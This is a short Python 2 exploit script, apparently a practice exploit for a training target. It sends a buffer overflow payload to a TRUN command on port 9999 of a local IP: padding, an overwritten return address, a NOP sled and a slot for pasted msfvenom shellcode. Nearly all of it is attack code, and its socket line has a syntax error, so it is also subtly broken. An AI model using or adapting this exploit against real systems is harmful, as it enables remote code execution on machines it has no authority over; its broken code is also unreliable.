#!/usr/bin/python

import sys, socket

overflow = (
# Paste response from msfvenom
)

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

# input pointer but in weird reverse format
# 32 is a knot, add a bit of padding between chars and overflow

try:
    s=socket.socket(socket.AF_INET.socket.SOCK_STREAM
    s.connect(('192.168.1.90',9999))
    s.send(('TRUN //.:/' + shellcode))
    s.close()

except:
    print "Error connecting to server"
    sys.exit()
